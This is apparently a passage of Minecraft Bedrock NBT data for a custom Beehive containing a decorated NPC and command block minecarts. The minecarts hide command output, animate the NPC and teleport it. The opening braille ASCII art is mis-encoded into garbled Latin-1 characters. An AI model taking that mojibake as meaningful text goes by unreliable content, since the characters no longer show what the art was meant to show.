+â£¿â£¿â¡‡â¡‡â£€â¢â££â¢²â£¶â£–â£¶â£¶â£¶â£¶â£¶â£¶â£¶â£¶â£¶â£¶â¢°â¡…â£¶â£¶â£¶â£¶â£¶â£¶â£¶â£¶â£²â£¶â£’â¢¶â£¶â¢â£‚â¢â¢¸â¢°â£¿â£¿
+â£¿â£¿â¡‡â¡‡â£·â ˆâ¢–â °â¡»â¡½â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¢¸â¡‡â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¢¯â£Ÿâ ®â¡±â¢â£¾â¢¸â¢°â£¿â£¿
+â£¿â£¿â¡‡â¡‡â£¿â£¾â£„â¡‹â •â¡¹â¡â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¢¸â¡‡â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¢Ÿâ â¡°â¢€â£¿â£¿â¢¸â¢¸â£¿â£¿
+â£¿â£¿â¡‡â¡‡â£¿â£¿â£¿â¡†â ¨â µâ£™â¡¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¢¸â¡‡â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â£³â¢â¡›â¡â£¥â£¿â£¿â£¿â¢¸â¢¸â£¿â£¿
+â£¿â£¾â¡‡â¡‡â£¿â£¿â£¿â£¿â£†â¡¦â¢›â¡™â¡â£¿â£¿â£¿â£¿â£¿â¢Ÿâ£«â ¾â §â£â¡»â£¿â£¿â£¿â£¿â£¿â£³â¢«â£ƒâ ˆâ£°â£¿â£¿â£¿â£¿â¢¸â¢¸â£¿â£¿
+â£¿â£¿â¡‡â£¿â£¿â£¿â£¿â£¿â£¿â£§â â¡šâ¡œâ£â¡¿â ›â ­â¢–â£¯â£¶â£¿â£¿â£¶â£Œâ¡²â¢­â¡»â ¿â£¿â££â —â „â£¶â£¿â£¿â£¿â£¿â£¿â¢¸â¢¸â£¿â£¿
+â£¿â£¿â¡‡â£¿â¡Ÿâ£¿â£¿â£¿â£¿â£¿â£§â¢…â ˆâ ¥â¢šâ¢¡â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â¡­â¡±â  â¢©â¡®â£¼â£¿â£¿â£¿â£¿â£¿â£¿â£¼â¢¸â£¿â£¿
+â£¿â£¿â¡‡â£Ÿâ¡‡â£¿â£¿â£¿â£¿â£¿â£¿â£§â¡â ‰â¢â£§â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£½â¡±â ‰â â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¢¸â£¹â£¿
+â£¿â£¿â¡‡â£¿â¡‡â£¿â£¿â£»â ¿â£¿â£¿â£¿â£·â£šâ ˜â¡«â¢³â¡»â£¿â£¿â£¿â£¿â£¿â£¿â£Ÿâ¡â£œâ¡ƒâ£†â£¾â£¿â£¿â£¿â¡¿â£¿â£¿â£¿â£¿â£¿â¢¸â£¿â£¿
+â£¿â£¿â£§â¢¿â¡³â£¯â£Ÿâ ¿â£¿â£¾â£Ÿâ¡¿â£¿â£¿â¡„â „â ¡â£»â¡¿â£¿â£¿â£¿â£¿â¢¯â¢â ¼â¡°â¢¡â£¿â£¿â¢¿â£»â£·â£¿â£¿â£›â¡½â¢Ÿâ¡¿â£¸â£¿â£¿
+â£¿â£¿â£¹â£·â£­â£—â ¯â£¿â¢¾â£½â¡¿â£¿â£¿â£½â£»â ¼â£‹â ‘â¡¹â£½â£¿â£¿â£»â¢â ®â¡•â¡§â£Ÿâ£¯â£¿â£¿â¢¿â£¯â¡µâ£¿â¢½â£šâ£µâ£¾â£¿â£¿â£¿
+â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â£â¡ºâ£Ÿâ¡·â£¿â£»â¢¿â£·â£†â Šâ¢“â¡½â£â£³â «â£“â¡ˆâ£°â£¿â¡¿â¢Ÿâ£½â â£»â¢—â£«â£¿â£¾â£¿â£¿â£¿â£¿â£¿â£¿
+â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¶â¡‰â¡»â¢½â£»â¢¯â£Ÿâ¡–â ”â£šâ¢œâ¡£â¢–â  â¢·â£»â¡·â£Ÿâ¡¯â£ºâ£½â£¾â£½â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
+â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£·â£®â£‘â «â£¿â¢¦â â¡©â¢…â¡‰â£µâ£«â¢â£«â¢â£¾â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡‡â¢¸â£¿â£¿â£¿â£¿
+â£¿â£¿â£¿â£¿â£¿â£¿â£¿â¡¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¤â£â ¢â ¼â¡‡â£–â£½â£¶â£¿â£¿â¡¿â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£Ÿâ£·â£¾â£¿â£¿â£¿â£¿",Invulnerable:1b,IsBaby:1b,Persistent:1b,RawtextName:"Â§rÂ§7Â§lî€£ï¼¤ï¼¥ï¼´ï¼¥ï¼²î€£'ï¼³  Â§cï¼®Â§2ï¼°Â§6ï¼£",Variant:34},TicksLeftToStay:0},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @e[type=npc,r=3] add  E",Invulnerable:1b,Persistent:1b,TickDelay:1,Ticking:1b,TicksLeftToStay:1,definitions:["+minecraft:agent"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule commandblockoutput false",Invulnerable:1b,Persistent:1b,TickDelay:1,Ticking:1b,TicksLeftToStay:1,definitions:["+minecraft:agent"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/playanimation @e[tag=E] animation.bee.fly.bobbing A 1000000",Invulnerable:1b,Persistent:1b,TickDelay:1,Ticking:1b,TicksLeftToStay:1,definitions:["+minecraft:agent"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @e[tag=E] ~ ~ ~ tp @e[tag=E] ~ ~0.5 ~",Invulnerable:1b,Persistent:1b,TickDelay:30,Ticking:1b,TicksLeftToStay:1,definitions:["+minecraft:agent"]}}],id:"Beehive"},pistonPosX:0,pistonPosY:0,pistonPosZ:0}}
